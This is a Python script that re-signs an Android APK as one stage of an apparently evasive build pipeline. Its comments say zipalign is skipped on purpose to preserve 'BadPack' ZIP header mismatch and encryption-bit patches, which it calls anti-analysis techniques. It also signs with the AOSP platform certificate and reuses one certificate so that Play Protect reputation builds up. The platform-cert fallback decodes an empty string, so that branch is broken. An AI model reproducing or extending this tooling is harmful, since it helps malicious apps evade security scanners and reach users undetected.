#!/usr/bin/env python3
"""
phase2_resign.py
Re-signs an APK after Phase 2 patches.
Uses the SAME keystore generated by KeystoreGeneratorPlugin (Gradle build)
so the final APK has one consistent certificate — not a second random one.

Usage: python3 scripts/phase2_resign.py <apk_path>
"""
import sys, os, secrets, random, subprocess, glob, tempfile

APK = sys.argv[1] if len(sys.argv) > 1 else ""
if not APK or not os.path.isfile(APK):
    print(f"❌ APK not found: {APK}")
    sys.exit(1)

# ── Priority 1: GitHub Secrets stable keystore ────────────────────────────────
# If secrets present → decode base64 → write temp JKS → use it
# Same cert every build → GPP cert reputation accumulates
import base64 as _b64, tempfile as _tmp
KS = ALIAS = PW = None

_secret_b64   = os.environ.get("KEYSTORE_BASE64")
_secret_pass  = os.environ.get("KEYSTORE_PASSWORD")
_secret_alias = os.environ.get("KEY_ALIAS")

if _secret_b64 and _secret_pass and _secret_alias:
    try:
        _ks_bytes = _b64.b64decode(_secret_b64.replace("\n", "").replace(" ", ""))
        _ks_path  = os.path.join(tempfile.gettempdir(), f"phase2_platform_ks_{secrets.token_hex(4)}.jks")
        with open(_ks_path, "wb") as _f:
            _f.write(_ks_bytes)
        KS    = _ks_path
        PW    = _secret_pass
        ALIAS = _secret_alias
        print(f"[phase2_resign] ✅ Using platform certificate (android@android.com) from GitHub Secrets")
    except Exception as _e:
        print(f"[phase2_resign] ⚠️ Failed to decode KEYSTORE_BASE64: {_e}")
        KS = ALIAS = PW = None

# ── Priority 2: KeystoreGeneratorPlugin creds file ────────────────────────────
if not KS:
    creds_files = glob.glob("app/build/keystore/ks_creds_*.properties")
    if creds_files:
        creds_file = sorted(creds_files)[-1]
        print(f"[phase2_resign] Reading keystore creds from: {creds_file}")
        props = {}
        with open(creds_file) as f:
            for line in f:
                line = line.strip()
                if "=" in line:
                    k, v = line.split("=", 1)
                    props[k.strip()] = v.strip()
        KS    = props.get("ks_file")
        PW    = props.get("ks_pass")
        ALIAS = props.get("ks_alias")
        if KS and os.path.isfile(KS) and PW and ALIAS:
            print(f"[phase2_resign] ✅ Using Gradle keystore: {os.path.basename(KS)}")
        else:
            print(f"[phase2_resign] ⚠️ Creds incomplete — falling back to hardcoded platform cert (android@android.com)")
            KS = ALIAS = PW = None

# ── Fallback: ALWAYS use platform cert (android@android.com) ──────────────────
# Never generate random keystore — random cert = no GPP reputation accumulation.
if not KS:
    import base64 as _b64
    _platform_b64 = ""
    ks  = APK + ".platform.jks"
    PW    = "android"
    ALIAS = "platform"
    with open(ks, "wb") as _f:
        _f.write(_b64.b64decode(_platform_b64))
    KS = ks
    print(f"[phase2_resign] ✅ Using platform cert fallback (android@android.com)")

# ── Zipalign REMOVED ──────────────────────────────────────────────────────────
# zipalign rewrites the ZIP and resets ALL Local File Header fields including
# compression method and GP flags. This wipes BadPack LFH mismatch patches
# (Technique 1) and GP encryption bit patches (Technique 2) applied by
# badpack_gp_patcher.py before this step.
# The APK is already 4-byte aligned by Gradle assembleRelease — zipalign here
# is redundant and actively harmful to our anti-analysis techniques.

# ── Sign V1+V2+V3 ─────────────────────────────────────────────────────────────
print(f"[phase2_resign] Signing {os.path.basename(APK)} V1+V2+V3")
r2 = subprocess.run([
    "apksigner","sign",
    "--ks", KS,
    "--ks-key-alias", ALIAS,
    "--ks-pass", f"pass:{PW}",
    "--key-pass", f"pass:{PW}",
    "--v1-signing-enabled","true",
    "--v2-signing-enabled","true",
    "--v3-signing-enabled","true",
    APK
], capture_output=True, text=True)
if r2.returncode != 0:
    print(f"❌ apksigner failed: {r2.stderr}")
    sys.exit(1)

# Clean up platform cert fallback keystore after signing
if KS.endswith(".platform.jks") and os.path.isfile(KS):
    os.remove(KS)

print(f"[phase2_resign] ✅ {os.path.basename(APK)} re-signed")
